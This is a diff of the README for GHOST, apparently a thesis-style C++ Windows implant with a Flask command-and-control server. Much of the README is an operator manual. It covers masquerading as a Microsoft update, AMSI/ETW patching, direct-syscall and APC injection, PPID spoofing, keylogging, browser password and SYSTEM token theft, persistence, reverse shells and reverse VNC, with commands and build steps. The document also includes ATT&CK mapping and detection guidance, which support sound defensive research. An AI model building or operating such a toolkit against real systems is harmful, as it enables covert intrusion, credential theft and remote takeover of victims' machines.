@@ -10,9 +10,10 @@
 ![Platform](https://img.shields.io/badge/Platform-Windows_x64-0078D4?style=flat-square&logo=windows&logoColor=white)
 ![Implant](https://img.shields.io/badge/Implant-C%2B%2B17-00599C?style=flat-square&logo=cplusplus&logoColor=white)
 ![C2 Server](https://img.shields.io/badge/C2_Flask-3.x-3776AB?style=flat-square&logo=python&logoColor=white)
-![Channel](https://img.shields.io/badge/Channel-ECDH_P--256_·_AES--256--GCM-6F42C1?style=flat-square)
+![Key exchange](https://img.shields.io/badge/Key_exchange-ECDH_P--256-6F42C1?style=flat-square)
+![Cipher](https://img.shields.io/badge/Cipher-AES--256--GCM-8250DF?style=flat-square)
 ![Protocol tests](https://img.shields.io/badge/Protocol_tests-27_checks-2EA043?style=flat-square)
-![CI](https://img.shields.io/badge/CI-build_·_protocol-8250DF?style=flat-square)
+![CI](https://img.shields.io/badge/CI-2_jobs-8250DF?style=flat-square&logo=githubactions&logoColor=white)
 ![Scope](https://img.shields.io/badge/Scope-Lab_only-C93A2B?style=flat-square)
 
 </div>
@@ -26,26 +27,25 @@
 >
 > It builds, installs, persists, injects, captures credentials and takes control of a
 > desktop. Running it against any system you do not own — or lack **explicit written
-> authorization** to test — is a criminal offence in most jurisdictions. The author
-> accepts no responsibility for misuse. Nothing here is a licence to offend.
+> authorization** to test — is a criminal offense in most jurisdictions. The author
+> accepts no responsibility for misuse. Nothing here is a license to break the law.
 
 ---
 
 ## Contents
 
-| | | |
-|---|---|---|
-| [1 · Overview](#1-overview) | [8 · Operator CLI](#8-operator-cli) | [15 · Testing & CI](#15-testing--ci) |
-| [2 · Quickstart](#2-quickstart) | [9 · C2 Server](#9-c2-server) | [16 · ATT&CK Mapping](#16-mitre-attack-mapping) |
-| [3 · Architecture](#3-architecture) | [10 · Implant Command Reference](#10-implant-command-reference) | [17 · Detection Guidance](#17-detection-guidance) |
-| [4 · Implant Lifecycle](#4-implant-lifecycle) | [11 · Build Guide](#11-build-guide) | [18 · Limitations](#18-known-limitations--scope) |
-| [5 · C2 Protocol](#5-c2-protocol--channel-security) | [12 · Configuration Reference](#12-configuration-reference) | [19 · Troubleshooting](#19-troubleshooting) |
-| [6 · Tradecraft Internals](#6-tradecraft-internals) | [13 · Lab Walkthrough](#13-lab-walkthrough) | [20 · Project Layout](#20-project-layout) |
-| [7 · Persistence](#7-persistence) | [14 · Operator Workflows](#14-operator-workflows) | [21 · Contributing / License](#21-contributing) |
+| | | | |
+|---|---|---|---|
+| [1. Overview](#1-overview) | [2. Quickstart](#2-quickstart) | [3. Architecture](#3-architecture) | [4. Implant lifecycle](#4-implant-lifecycle) |
+| [5. C2 protocol](#5-c2-protocol-and-channel-security) | [6. Tradecraft internals](#6-tradecraft-internals) | [7. Persistence](#7-persistence) | [8. Operator CLI](#8-operator-cli) |
+| [9. C2 server](#9-c2-server) | [10. Command reference](#10-implant-command-reference) | [11. Build guide](#11-build-guide) | [12. Configuration](#12-configuration-reference) |
+| [13. Lab walkthrough](#13-lab-walkthrough) | [14. Operator workflows](#14-operator-workflows) | [15. Testing and CI](#15-testing-and-ci) | [16. MITRE ATT&CK](#16-mitre-attck-mapping) |
+| [17. Detection guidance](#17-detection-guidance) | [18. Known limitations](#18-known-limitations-and-scope) | [19. Troubleshooting](#19-troubleshooting) | [20. Project layout](#20-project-layout) |
+| [21. Contributing](#21-contributing) | [22. Roadmap](#22-roadmap) | [23. License](#23-license-and-permitted-use) | [24. Disclaimer](#24-disclaimer) |
 
 ---
 
-## 1 · Overview
+## 1. Overview
 
 GHOST answers one question from both directions:
 
@@ -57,7 +57,7 @@ Three cooperating components make up the framework:
 | Component | Tech | Responsibility |
 |---|---|---|
 | **Implant** | C++17 · Win32 + Native API · MinGW-w64 cross-compile | Beacon agent that demonstrates post-exploitation techniques |
-| **C2 server** | Python 3.10+ · Flask REST · in-memory state | Session enrolment, task routing, payload staging, audit trail |
+| **C2 server** | Python 3.10+ · Flask REST · in-memory state | Session enrollment, task routing, payload staging, audit trail |
 | **Operator CLI** | Python 3 · console + subcommands | Scriptable operator console, reverse-shell listener, JSON output |
 
 The research value is **measurability**. Every technique is named, isolated in one module and
@@ -74,11 +74,11 @@ for EDR / SIEM coverage validation.
 
 - Not a pentest product, not a supportable red-team platform, and not a network scanner.
 - Not durable infrastructure: the server holds **all state in memory** and loses sessions, results and audit history on restart.
-- Not stealth-guaranteed: see [Known limitations](#18-known-limitations--scope) for the honest threat model, including a documented MITM gap.
+- Not stealth-guaranteed: see [Known limitations](#18-known-limitations-and-scope) for the honest threat model, including a documented MITM gap.
 
 ---
 
-## 2 · Quickstart
+## 2. Quickstart
 
 Fastest path from clone to a live session. Full detail lives in [Build guide](#11-build-guide)
 and [Lab walkthrough](#13-lab-walkthrough).
@@ -145,7 +145,7 @@ python tests/test_protocol.py     # 27 end-to-end checks against a live server
 
 ---
 
-## 3 · Architecture
+## 3. Architecture
 
 ```mermaid
 flowchart LR
@@ -162,7 +162,7 @@ flowchart LR
 
     subgraph LAB["🪟 Lab VM — Windows x64"]
         IMPL["WindowsSecurityUpdate.exe<br/>GHOST implant"]
-        VNC["Any standard VNC viewer<br/>RFB 3.3"]
+        VNC["VNC viewer in listen mode<br/>RFB 3.3"]
     end
 
     CLI -->|"X-Operator-Token"| SRV
@@ -182,7 +182,7 @@ which is why no listener needs to be reachable from outside on the victim.
 
 ---
 
-## 4 · Implant lifecycle
+## 4. Implant lifecycle
 
 `WinMain` is a supervisor; the beacon work runs on a worker thread that is restarted on crash.
 
@@ -197,7 +197,7 @@ sequenceDiagram
     W->>W: Single-instance mutex, name derived from C: volume serial
     W->>W: SelfInstall → copy to %APPDATA%\Microsoft\WindowsUpdate<br/>hide + system attrs, spawn installed copy, schedule self-delete of original
     W->>T: CreateThread (restart loop, backoff 5s → 60s cap)
-    T->>T: Sandbox check (uptime < 240s AND < 50 processes) → idle until cleared
+    T->>T: Sandbox check (uptime under 240 s AND fewer than 50 processes) → idle until cleared
     T->>T: DecoyLoop busy-work · InitializeSyscalls (Hell's Gate + Halo's Gate)
     T->>T: PatchAMSI · PatchETW · ClearHardwareBreakpoints
     T->>T: Defender exclusion + HKCU/HKLM Run persistence (only if elevated)
@@ -212,7 +212,7 @@ sequenceDiagram
     end
 ```
 
-| Stage | Behaviour worth knowing |
+| Stage | Behavior worth knowing |
 |---|---|
 | **Instance guard** | Mutex name is built from the `C:` volume serial mixed with a compile-time constant and formatted as a fake COM GUID — one instance per machine, and no cross-machine signature. It waits 20 s for the parent to release during self-install handoff instead of self-terminating. |
 | **Self-install** | Copies to `%APPDATA%\Microsoft\WindowsUpdate\WindowsSecurityUpdate.exe`, sets hidden + system, launches the installed copy, then deletes the original via a delayed `cmd /c ping & del`. If the copy fails it runs in place. |
@@ -223,7 +223,7 @@ sequenceDiagram
 
 ---
 
-## 5 · C2 protocol & channel security
+## 5. C2 protocol and channel security
 
 The channel is layered so that neither the tunnel provider nor a passive network observer can
 read task content.
@@ -281,7 +281,7 @@ the implant adopts the new key within one beacon interval with no operator actio
 
 ---
 
-## 6 · Tradecraft internals
+## 6. Tradecraft internals
 
 Each mechanism is isolated in one module so it can be enabled, disabled and measured independently.
 
@@ -294,8 +294,19 @@ in RVA order — that is what makes **Halo's Gate** work: if a target stub is ho
 `FF 25` jump at entry), neighbouring exports are scanned up to ±60 slots and the number is
 recomputed by delta. Numbers are then written into freshly allocated RX trampoline stubs.
 
-Three functions are mandatory (failure aborts the thread); the rest resolve optionally and the
-injection path falls back to Win32 equivalents when they are unavailable.
+All eleven entries are resolved through **`RESOLVE_OPT`**: a number that cannot be found is skipped
+silently, and each injection helper tests its slot and falls back to the Win32 equivalent
+(`OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`) when it is null. A
+strict `RESOLVE` macro — any miss aborts initialization — exists for hard-critical entries but is
+not currently used, so `InitializeSyscalls` only fails outright when ntdll can neither be read from
+disk nor mapped from the loaded module, or its export table will not parse. `WinMain` retries the
+initialization five times, five seconds apart, then lets the thread return so the supervisor
+restarts it.
+
+Stub bytes are an 11-byte `mov r10,rcx / mov eax,<ssn> / syscall / ret` written into a single
+`VirtualAlloc` pool that is flipped to `PAGE_EXECUTE_READ` and icache-flushed after the last stub
+lands. If the on-disk read fails, ntdll is mapped from the loaded module as a fallback view —
+visible hooks are then handled by Halo's Gate instead.
 
 ### API and string resolution — `obfuscate.hpp`
 
@@ -317,7 +328,7 @@ Net effect: `strings` on the binary yields no URLs, no API names and no PowerShe
 - **Hardware breakpoints**: debug registers cleared through `NtQuery/NtSetInformationThread` — anti-instrumentation.
 - **Memory patching** goes `NtProtectVirtualMemory` → write → `FlushInstructionCache` → restore, with a `VirtualProtect` fallback.
 - **Microsoft Defender exclusion** is attempted only when elevated; tamper-protection changes require SYSTEM/TrustedInstaller, which the token-steal path can provide.
-- **Sandbox check**: uptime < 240 s **and** fewer than 50 processes ⇒ assumed automated analysis, and the implant idles instead of executing. Disabled in `DEBUG` builds.
+- **Sandbox check**: uptime under 240 s **and** fewer than 50 processes ⇒ assumed automated analysis, and the implant idles instead of executing. Disabled in `DEBUG` builds.
 - **Sleep evasion**: `SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED)` while beaconing, released before each idle sleep.
 
 ### Masquerading — `resources/`, `main.cpp`
@@ -328,20 +339,26 @@ Net effect: `strings` on the binary yields no URLs, no API names and no PowerShe
 | Version resource | `Microsoft Corporation`, `Windows Security Update Service`, `10.0.22621.2506 (WinBuild.160101.0800)` — matches what Sigcheck/PE-bear show on real System32 binaries |
 | Manifest | `asInvoker` (no UAC prompt), PerMonitorV2 DPI, Win7 → Win11 compatibility GUIDs, assembly name `Microsoft.Windows.SecurityUpdateService` |
 | PEB | `ImagePathName` and `CommandLine` Unicode strings overwritten — Task Manager and PEB-reading tools show the fake path |
-| PE timestamp | Randomised to a 2018–2024 value at build time (release only) |
+| PE timestamp | Randomized to a 2018–2024 value at build time (release only) |
 | Release binary | `-static`, stripped, `.comment`/`.note` removed, `--gc-sections`, ASLR + high-entropy VA + NX preserved |
 
 ### Injection — `injection.cpp`
 
 - **Remote-thread chain** over direct syscalls: `NtOpenProcess` → `NtAllocateVirtualMemory` →
   `NtWriteVirtualMemory` → `NtProtectVirtualMemory` → `NtCreateThreadEx`.
-- **APC injection**: `NtOpenThread` → allocate/write/protect → `NtQueueApcThread`, with
-  `NtSuspendThread` / `NtResumeThread` for a target that is not alertable.
-- **PPID spoofing**: `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` on `CreateProcessW` so a spawned
-  process appears as a child of a legitimate target (defaults toward `svchost.exe` enumeration),
-  defeating parent-chain heuristics.
-- **Migration**: `!migrate <pid>` injects a copy into the target and exits with `0xDEAD` so the
-  mutex releases and the child takes over the session.
+- **APC injection**: the target's threads are enumerated with a Toolhelp snapshot and opened
+  through a hash-resolved `OpenThread` (`THREAD_SET_CONTEXT | SUSPEND_RESUME | QUERY_INFORMATION`);
+  the shellcode is allocated, written and re-protected remotely, then queued with
+  `NtQueueApcThread` between `NtSuspendThread` and `NtResumeThread`. The first thread that accepts
+  the APC wins; the whole path returns failure cleanly if the three native thread syscalls did not
+  resolve.
+- **PPID spoofing**: `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` on `CreateProcessW` so a new process
+  appears as the child of a legitimate long-running service host instead of the implant —
+  `!migrate` uses it to parent a fresh copy of itself.
+- **Migration**: `!migrate [pid]` spawns a **second copy of the implant** under the chosen parent
+  (default: the lowest-PID `svchost.exe` running as SYSTEM, found by token SID), sets a
+  `__GHOST_SPAWNED` sentinel so the child skips the instance-mutex check, then exits with `0xDEAD`
+  so the parent releases the mutex and the child takes over the session.
 
 ### Capture modules
 
@@ -349,19 +366,19 @@ Net effect: `strings` on the binary yields no URLs, no API names and no PowerShe
 |---|---|
 | `keylog.cpp` | `WH_KEYBOARD_LL` hook on a dedicated pumped thread; `ToUnicode` for dead keys/shift, common VKs mapped to tokens (`[BS]`, `[ESC]`, `[PGU]`…), bare modifiers ignored, circular buffer capped at 64 K chars, mutex-guarded |
 | `!screenshot` | GDI capture to a 32 bpp DIB, BMP with `[SCREENSHOT:BMP]` marker, streamed base64; optional scale factor |
-| `vnc.cpp` | **Reverse VNC**: dials `host[:port]` (default 5500), serves RFB **3.3** with *None* auth; 32×32 changed-tile encoding, `SendInput` replay for keyboard/mouse — any standard viewer connects. Non-blocking connect with a 5 s cap so a dead endpoint cannot stall the beacon |
-| `!live` / `!input` | Beacon-paced remote control: one task returns a scaled frame and optionally injects normalised mouse coordinates (`!input m <nx> <ny> <btns>`) or a virtual-key event (`!input k <vk> <down>`), enabling browser-based interactive control from the dashboard |
+| `vnc.cpp` | **Reverse VNC**: dials `host[:port]` (default 5500) and serves RFB **3.3** with *None* auth; 32×32 changed-tile encoding, `SendInput` replay for keyboard/mouse. Because the implant is the connector, the operator side must be **listening** — a viewer in reverse/listen mode, or an ngrok TCP endpoint in front of one. Non-blocking connect with a 5 s cap so a dead endpoint cannot stall the beacon |
+| `!live` / `!input` | Beacon-paced remote control: one task returns a scaled frame and optionally injects normalized mouse coordinates (`!input m <nx> <ny> <btns>`) or a virtual-key event (`!input k <vk> <down>`), enabling browser-based interactive control from the dashboard |
 | `!browser` | Edge / Chrome saved-password recovery (T1555.003) using **stock Windows only**: `winsqlite3.dll` reads a copy of `Login Data`, `os_crypt` master key from `Local State` is DPAPI-unprotected, then AES-256-GCM (bcrypt) on `v10`/`v11` blobs with plain-DPAPI fallback for pre-v80 rows. Chrome ≥ 127 `v20` app-bound entries are **detected and reported as not recoverable**. The PowerShell payload is embedded as XOR chunks generated from `tests/browser_dump.ps1` |
 | `!clipboard` | Read/write clipboard text |
 
 ---
 
-## 7 · Persistence
+## 7. Persistence
 
 Three vectors are installed at startup; WMI and Task Scheduler run on a background thread
 because `IWbemServices::ConnectServer` can block indefinitely on a busy WMI provider.
 
-| Vector | Artifact | Elevated behaviour |
+| Vector | Artifact | Elevated behavior |
 |---|---|---|
 | Registry Run key | `…\CurrentVersion\Run` value pointing at the installed copy | Always writes `HKCU`; additionally writes `HKLM` when elevated |
 | Scheduled task | `MicrosoftEdgeUpdateTaskUser` | `/RL HIGHEST /SC ONSTART` when elevated, `/RL LIMITED /SC ONLOGON` otherwise |
@@ -373,7 +390,7 @@ a lab run can be left exactly as it was found.
 
 ---
 
-## 8 · Operator CLI
+## 8. Operator CLI
 
 `server/c2_cli.py` runs as an interactive console or as one-shot subcommands.
 Configuration precedence (highest first): **CLI flags → environment → `~/.ghost/operator.json`**.
@@ -385,13 +402,13 @@ Configuration precedence (highest first): **CLI flags → environment → `~/.gh
 | `c2_cli.py shell <sid>` | Attach a shell — background result poller (2 s), Braille spinner while waiting, 90 s result timeout |
 | `c2_cli.py task <sid> <cmd>` | Queue one command |
 | `c2_cli.py batch <sid> "c1;c2;…"` | Queue several commands in one call |
-| `c2_cli.py results <sid> [--clear] [--json]` | Read (and optionally drain) stored results |
+| `c2_cli.py results <sid> [--clear] [--all] [--json]` | Read (and optionally drain) stored results |
 | `c2_cli.py export <sid> [file]` | Dump all results to `ghost_<sid8>_<ts>.txt` |
 | `c2_cli.py kill <sid>` | Queue exit and remove the session |
 | `c2_cli.py audit [--limit N] [--json]` | Operator audit trail |
 | `c2_cli.py watch [--interval N]` | Full-screen live session list with new-session notifications |
 | `c2_cli.py payload upload <file>` | Stage a binary for `!getfile` retrieval |
-| `c2_cli.py listen --port <p>` | Local listener for `!reverse` dial-out shells |
+| `c2_cli.py listen [--port <p>]` | Local listener for `!reverse` dial-out shells (**default 4444**) |
 | `c2_cli.py config show` / `config set --url --token --proxy` | Inspect / persist operator config |
 | `c2_cli.py ping` | Server reachability + live node count |
 
@@ -403,9 +420,13 @@ Readline history persists to `~/.ghost/history` with tab completion on the commo
 available. The CLI rotates realistic browser User-Agents per request and disables TLS-warning noise
 by default; pass `--ssl-verify` when the server has a real certificate.
 
+> **Port pairing.** `!reverse` defaults to port **443** while `listen` defaults to **4444**, so the
+> two only meet if you say so explicitly: `listen --port 443` (needs a free privileged port) or
+> `!reverse <operator-ip>:4444`.
+
 ---
 
-## 9 · C2 server
+## 9. C2 server
 
 ```bash
 python server/c2_server.py [--config ghost.json] [--tls] [--auto-accept] \
@@ -424,28 +445,35 @@ python server/c2_server.py [--config ghost.json] [--tls] [--auto-accept] \
 | `GET /results/<sid>[?clear=1]` | operator token | Read / drain stored results |
 | `POST /payload` · `GET /payload` | operator / beacon | Binary staging for implant-side retrieval |
 | `GET /audit?limit=` · `POST /audit/clear` | operator token | Audit trail |
-| `POST /auth` · `GET|POST /logout` | dashboard form login | Web dashboard session |
+| `POST /auth` · `GET`/`POST /logout` | dashboard form login | Web dashboard session |
 | `GET /dashboard` | — | Dashboard HTML (served at `/` too) |
 | `GET /health` · `GET /ping` | — | Liveness / node count |
 
-Background behaviour: a **janitor** thread prunes sessions idle beyond `session_ttl` every 300 s,
+Background behavior: a **janitor** thread prunes sessions idle beyond `session_ttl` every 300 s,
 and a status printer reports live/pending node counts. All CORS preflight is answered from one
 place so the dashboard and CLI can talk to the same origin.
 
 ### Audit events
 
-Every operator and agent action is recorded with timestamp, client IP, action and detail:
+Every operator and agent action is appended to a capped in-memory trail with timestamp, client IP,
+action and detail. Fourteen event types, all of them emitted by named code paths in
+`server/c2_server.py`:
 
-`task_queued` · `task_sent` · `task_ack` · `result` · `result_dup` · `replay_rejected`
-`beacon_rehandshake` · `session_accepted` · `session_rejected` · `kill_session`
-`payload_uploaded` · `payload_downloaded` · `get_results` · `auth_fail`
+| Fires when | Events |
+|---|---|
+| Tasking | `task_queued` · `task_sent` · `task_ack` |
+| Results | `result` · `result_dup` · `get_results` |
+| Channel integrity | `replay_rejected` · `beacon_rehandshake` |
+| Enrollment and lifecycle | `session_accepted` · `session_rejected` · `kill_session` |
+| Payload staging | `payload_uploaded` · `payload_downloaded` |
+| Authentication | `auth_fail` |
 
 The trail is the primary artifact for the thesis: it proves at-least-once delivery, dedup and
-rejection behaviour without packet captures.
+rejection behavior without packet captures.
 
 ---
 
-## 10 · Implant Command Reference
+## 10. Implant command reference
 
 Anything not matched by the table below is executed in a **persistent `cmd.exe` shell** — the
 implant owns the shell state, so the working directory and `set` variables survive across tasks
@@ -457,17 +485,17 @@ implant owns the shell state, so the working directory and `set` variables survi
 | `ps` / `!ps` | Process listing |
 | `ps1 <line>` · `psreset` | Persistent interactive PowerShell session; restart it |
 | `!screenshot [scale]` | Full-screen capture, BMP streamed as base64 |
-| `!vnc <host[:port]>` | **Reverse VNC** — dials out (default port 5500), then connect any VNC viewer to that listener (RFB 3.3, no auth) |
+| `!vnc <host[:port]>` | **Reverse VNC** — dials out (default port 5500); have a viewer listening in **reverse/listen mode** before tasking (RFB 3.3, no auth) |
 | `!live [scale]` · `!input m <nx> <ny> <btns>` · `!input k <vk> <down>` | Beacon-paced live frame / synthetic mouse and keyboard input |
 | `keylog_start` · `keylog_dump` · `keylog_stop` | Keystroke capture lifecycle |
 | `!clipboard [get\|set <text>]` | Clipboard read / write |
-| `!browser` | Edge/Chrome saved-password recovery (see [capture modules](#6--tradecraft-internals)) |
+| `!browser` | Edge/Chrome saved-password recovery (see [capture modules](#6-tradecraft-internals)) |
 | `download <url> <dest>` | Fetch a file on the implant |
 | `upload <src> <dest>` | Stage a local file for operator retrieval |
 | `!files [path]` · `!getfile <path>` | Directory listing / pull a staged file through `/payload` |
-| `!inject <pid> <shellcode>` | Direct-syscall remote-thread injection |
-| `!inject-apc <pid> <shellcode>` | APC injection |
-| `!migrate <pid>` | Move the implant into another process and exit cleanly |
+| `!inject <pid> <hex bytes>` | Load raw shellcode into a process via the direct-syscall remote-thread chain |
+| `!inject-apc <pid> <hex bytes>` | Same payload, delivered as an APC to one of the target's threads |
+| `!migrate [pid]` | Re-spawn the implant as a PPID-spoofed child of `pid` (default: a SYSTEM `svchost.exe`) and exit cleanly |
 | `steal_token` | Locates `winlogon.exe`, duplicates its primary token and impersonates SYSTEM (**no arguments**) |
 | `!reverse <ip[:port]>` | Reverse TCP shell, default port 443 → pair with `c2_cli.py listen` |
 | `!kill <pid>` | Terminate a process |
@@ -484,7 +512,7 @@ implant owns the shell state, so the working directory and `set` variables survi
 
 ---
 
-## 11 · Build Guide
+## 11. Build guide
 
 ### One-time toolchain
 
@@ -498,7 +526,7 @@ Windows hosts can build the same way under WSL; the implant itself only *runs* o
 ### Build modes
 
 ```bash
-./build.sh                 # release: -O2, _FORTIFY_SOURCE=2, stripped, PE timestamp randomised
+./build.sh                 # release: -O2, _FORTIFY_SOURCE=2, stripped, PE timestamp randomized
 ./build.sh --debug         # -O0 -g3 -DDEBUG -DGHOST_DEBUG: verbose debug log, sandbox checks off
 ./build.sh --clean         # remove build/
 ```
@@ -508,14 +536,14 @@ Windows hosts can build the same way under WSL; the implant itself only *runs* o
 | Resource compile | `windres resources/ghost.rc` → version info, manifest, embedded `wall.jpg` as `RCDATA` |
 | Compile | C++17, `UNICODE`, `_WIN32_WINNT=0x0A00`, `-fno-rtti`, function/data sections, `-fstack-protector-strong`, static libstdc++/libgcc |
 | Link | `-Wl,--gc-sections --nxcompat --dynamicbase --high-entropy-va` against `ntdll ws2_32 user32 advapi32 ole32 oleaut32 wbemuuid bcrypt crypt32 winhttp dnsapi shlwapi gdi32 shell32` |
-| Post | `strip --strip-all` + remove `.comment`/`.note`; randomise the PE `TimeDateStamp` |
+| Post | `strip --strip-all` + remove `.comment`/`.note`; randomize the PE `TimeDateStamp` |
 
 The build is warning-clean under `-Wall -Wextra` (a few specific warnings are silenced deliberately);
 CI fails if it stops being so. Output is a single `build/WindowsSecurityUpdate.exe`.
 
 ---
 
-## 12 · Configuration Reference
+## 12. Configuration reference
 
 No operational value is hard-coded at a call site — implant values are set at build time, and
 server values route through one config dictionary.
@@ -529,7 +557,8 @@ server values route through one config dictionary.
 | `GHOST_BEACON_MIN` / `GHOST_BEACON_MAX` | Jitter bounds, seconds (validated `3 ≤ min ≤ max`) | 18 / 24 |
 | `GHOST_C2_HOST` / `GHOST_C2_PORT` / `GHOST_BEACON_TOKEN_W` | Raw `-D` macros the script emits | set by `build.sh` |
 | `GHOST_K0..K3` (`obfuscate.hpp`) | Rotating XOR key — change per campaign build | `A7 3E C1 58` |
-| Compile-time constants | `MAX_FAILURES` 5 · `BACKOFF_FACTOR` 3 · `CMD_OUTPUT_MAX` 65536 · `CMD_TIMEOUT_MS` 30000 | `include/config.hpp` |
+| `CMD_OUTPUT_MAX` / `CMD_TIMEOUT_MS` | 65536 chars of text result before truncation / 30 s per command | `include/config.hpp` |
+| `MAX_FAILURES` / `BACKOFF_FACTOR` | 5 / 3 — declared for reference; the live beacon backoff is computed in `src/c2.cpp` as `BEACON_MIN × 2^failures`, capped 30 min | `include/config.hpp` |
 
 ### Server
 
@@ -571,16 +600,16 @@ and CLI flags win over both. Unknown keys in the config file are rejected rather
 
 ---
 
-## 13 · Lab Walkthrough
+## 13. Lab walkthrough
 
 1. **Isolate.** Dedicated hypervisor network (host-only or VLAN), no production credentials, a
    clean snapshot before every run, and packet capture (`tcpdump`/`rkavd`/Wireshark) on the lab segment.
 2. **Build.** `C2_HOST=<tunnel> ./build.sh`, note the beacon token it prints.
 3. **Serve.** Start `c2_server.py --tls --beacon-token <…> --operator-token <…>`, expose via `ngrok http 8080`.
-   Enable TLS because the implant always speaks HTTPS; skip `--auto-accept` to practise enrolment.
+   Enable TLS because the implant always speaks HTTPS; skip `--auto-accept` to practice enrollment.
 4. **Detonate.** Copy the implant into the lab VM and run it as the account you want to observe
    (`asInvoker` — no UAC prompt; run elevated to exercise the elevated persistence and Defender paths).
-5. **Emulate.** Walk the [capability matrix](#16-mitre-attack-mapping) row by row, one technique per task.
+5. **Emulate.** Walk the [capability matrix](#16-mitre-attck-mapping) row by row, one technique per task.
 6. **Collect.** Sysmon + ETW + `procmon` + PCAP for each technique; drain results with `export`.
 7. **Detect.** Write or validate SIEM rules against the telemetry. Record what fired and what stayed silent.
 8. **Report.** Every technique carries an ATT&CK id, so results roll straight into a coverage matrix.
@@ -588,9 +617,9 @@ and CLI flags win over both. Unknown keys in the config file are rejected rather
 
 ---
 
-## 14 · Operator Workflows
+## 14. Operator workflows
 
-**First session of a run (manual enrolment).**
+**First session of a run (manual enrollment).**
 
 ```bash
 python server/c2_cli.py --url https://<tunnel> --token <operator-token> watch
@@ -623,12 +652,14 @@ python server/c2_cli.py audit --limit 200 --json >> run_01.json
 python server/c2_cli.py listen --port 4444 &      # operator listener
 python server/c2_cli.py task <sid> "!reverse <operator-ip>:4444"
 python server/c2_cli.py task <sid> "!vnc <operator-ip>:5500"
-# then point any VNC viewer at the listener on 5500
+# the operator side must already be listening:
+#   vncviewer -listen            (viewer in reverse/listen mode on 5500), or
+#   ngrok tcp 5500               in front of that listener for a remote operator
 ```
 
 ---
 
-## 15 · Testing & CI
+## 15. Testing and CI
 
 ### Local suites
 
@@ -657,7 +688,7 @@ builds warning-clean", without any live implant involved.
 
 ---
 
-## 16 · MITRE ATT&CK Mapping
+## 16. MITRE ATT&CK mapping
 
 Every implanted technique is a detection test case — validate an EDR against one row at a time.
 
@@ -684,7 +715,7 @@ Every implanted technique is a detection test case — validate an EDR against o
 | Hardware-breakpoint clearing | [T1622](https://attack.mitre.org/techniques/T1622/) | `evasion.cpp` |
 | Single-instance execution guard | [T1480.001](https://attack.mitre.org/techniques/T1480/001/) | `main.cpp` |
 | Self-deletion of the original dropper | [T1070.004](https://attack.mitre.org/techniques/T1070/004/) | `main.cpp` |
-| PE compile-timestamp randomisation (build-time) | [T1070.006](https://attack.mitre.org/techniques/T1070/006/) | `build.sh` |
+| PE compile-timestamp randomization (build-time) | [T1070.006](https://attack.mitre.org/techniques/T1070/006/) | `build.sh` |
 | Persistence removal (`!uninstall`) | [T1070.008](https://attack.mitre.org/techniques/T1070/008/) | `c2.cpp`, `persistence.cpp` |
 | Keylogging via low-level hook | [T1056.001](https://attack.mitre.org/techniques/T1056/001/) | `keylog.cpp` |
 | Browser credential store extraction | [T1555.003](https://attack.mitre.org/techniques/T1555/003/) | `c2.cpp` |
@@ -699,7 +730,7 @@ Every implanted technique is a detection test case — validate an EDR against o
 
 ---
 
-## 17 · Detection Guidance
+## 17. Detection guidance
 
 The point of the project. For each mechanism, the artifact a defender should be able to find.
 
@@ -709,15 +740,15 @@ The point of the project. For each mechanism, the artifact a defender should be 
 | Image loaded from `%APPDATA%` with Microsoft version metadata | Sysmon EID 1 + `FileVersion`/`CompanyName` | Signed-metadata look without an Authenticode signature |
 | Process whose PEB path ≠ its real on-disk path | EDR process tree vs. filesystem correlation | Deliberate `ImagePathName` overwrite |
 | `CreateRemoteThread` / `NtCreateThreadEx` into `svchost`, `explorer`, `winlogon` | Sysmon EID 8, ETW `Microsoft-Windows-Kernel-Process` | Cross-process write + start is the injection signature |
-| `NtAllocateVirtualMemory` with `PAGE_EXECUTE_READWRITE` in a remote process | ETW `Kernel-Processthread` | RWX in a foreign process is rarely legitimate |
+| Remote allocation that lands `PAGE_READWRITE` and is then flipped to `PAGE_EXECUTE_READ` | ETW `Kernel-Processthread`, `NtProtectVirtualMemory` tracing | The write-then-protect dance in a **foreign** process is the injection signature; GDI/heap code does not do it |
 | Child process with an implausible parent (e.g. `cmd.exe` parented to `svchost.exe`) | Process-tree analytics | PPID spoofing changes only the claimed parent |
 | `amsi.dll` / `etw.dll` text-page modifications in a scanned process | EDR hook-integrity checks, `VirtualProtect` call tracing | Patched to `xor eax,eax; ret` / `ret` |
-| `Add-MpPreference` / `EXclusionPath` registry writes, tamper-protection keys | Sysmon EID 12/13/14 on `Microsoft\Windows Defender` | Exclusion added by a non-management process |
-| WMI `NTEventFilter` / `EventConsumer` / `FilterToConsumerBinding` creation | `MSBldWmiProvider`-style auditing, `MSFT_*` namespace polling | Permanent subscriptions are the classic WMI persistence |
+| `Add-MpPreference` / `ExclusionPath` registry writes, tamper-protection keys | Sysmon EID 12/13/14 on `Microsoft\Windows Defender` | Exclusion added by a non-management process |
+| WMI `NTEventFilter` / `EventConsumer` / `FilterToConsumerBinding` creation | ETW `Microsoft-Windows-WMI-Activity/Operational` (event id 11 logs new bindings), repository deltas | Permanent subscriptions are the classic WMI persistence |
 | `schtasks.exe /Create /TN MicrosoftEdgeUpdateTaskUser` with `/RL HIGHEST` | Sysmon EID 1 command line | Task name mimics Edge but the action path is user-writable |
 | Run-key writes referencing `%APPDATA%` | Registry EID 12/13/14 | User-writable autostart target |
 | Beacon at a 18–24 s jitter with a `Microsoft-WNS/10.0` User-Agent | Network/egress telemetry, JA3 + SNI baselines | Real WNS traffic does not post encrypted JSON to an ngrok domain |
-| High-entropy short POST bodies to a new tunnel domain at a fixed cadence | DNS + proxy logs, TLS SNI | Randomised ciphertext + regular intervals ≈ C2 |
+| High-entropy short POST bodies to a new tunnel domain at a fixed cadence | DNS + proxy logs, TLS SNI | Randomized ciphertext + regular intervals ≈ C2 |
 | `SetThreadExecutionState` from an unsigned GUI-subsystem binary | ETW / API monitoring | Sleep evasion in a "update service" helper |
 | Debug registers cleared (`Dr7 = 0`) on a new thread | EDR anti-debug telemetry | Anti-instrumentation |
 | `WH_KEYBOARD_LL` hook installed by an unfamiliar process | ETW / hook enumeration | Keylogging without a product purpose |
@@ -728,13 +759,13 @@ The point of the project. For each mechanism, the artifact a defender should be 
 
 ---
 
-## 18 · Known Limitations & Scope
+## 18. Known limitations and scope
 
 Documented deliberately — these are part of the thesis, not bugs to hide.
 
 | Limitation | Detail |
 |---|---|
